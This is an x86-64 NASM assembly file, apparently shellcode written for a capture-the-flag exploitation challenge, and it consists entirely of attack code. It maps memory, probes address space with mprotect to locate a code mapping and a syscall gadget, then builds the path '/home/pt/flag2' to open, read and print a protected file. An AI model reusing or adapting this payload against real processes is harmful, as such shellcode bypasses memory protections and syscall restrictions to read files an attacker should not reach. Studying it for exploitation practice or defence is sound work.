BITS 64
section .text

;/* call mmap(0, 35184372088832, 7, 278562, -1, 0) */
mov rdi, 0
mov rsi, 0x200000000000
mov rdx, 0x3
;mov r10, 0x44021
mov r10, 0x44022
mov r8, -0x1
xor r9,r9
mov rax,0x9
syscall

cmp eax,0xaac00000
je error

;mov rdi, 0x1
;mov rsi, rax
;mov rdx, 0x10
;mov rax, 0x1
;syscall

;search for 41 ff d4 48
mov    QWORD [rsp+0x8],rax
mov    DWORD [rsp+0x10],0x0
jmp    gt_check
sub_one_k:
sub    QWORD [rsp+0x8],0x1000

mov    rax,QWORD [rsp+0x8]
call do_mprotect
cmp rax,0x0
je mapping_found

;movzx  eax,BYTE [rax]
;mov    BYTE PTR [rsp-0xd],al

add    DWORD [rsp+0x10],0x1
gt_check:
cmp    DWORD [rsp+0x10],0x1000
jle    sub_one_k

mov rax, 0x42424242
jmp error

mapping_found:
;check if it's the code or the stack
sub    QWORD [rsp+0x8],0x2000
mov    rax,QWORD [rsp+0x8]
mov al, BYTE [rax]
cmp al, 0x41
je code_found
mov rax,0x43434343
jmp error

code_found:
mov rbp,rsp
push 0x0
mov rax, 0x3267616c662f
push rax
mov rax, 0x70742f656d6f682f
push rax
mov rax, 2
mov rdi, rsp
mov rsi, 0
call do_syscall

mov rdi, rax
lea rsi, [rsp - 0x1000]
mov rdx, 0x100
xor rax, rax
call do_syscall

mov rdx, rax
mov rdi, 1
mov rax, 1
call do_syscall

do_syscall:
mov    r15,QWORD [rbp+0x8]
add r15,0xb0
call r15
ret

do_mprotect:
mov rdx,0x7
mov rsi,0x1000
mov rdi,rax
mov rax,10
syscall
ret

error:
push rax
mov rax,rsp
call do_write
push 0x41414141
ret

do_write:
push 0x1
pop rdi
mov rsi, rax
push 0x8
pop rdx
push 0x1
pop rax
syscall
ret
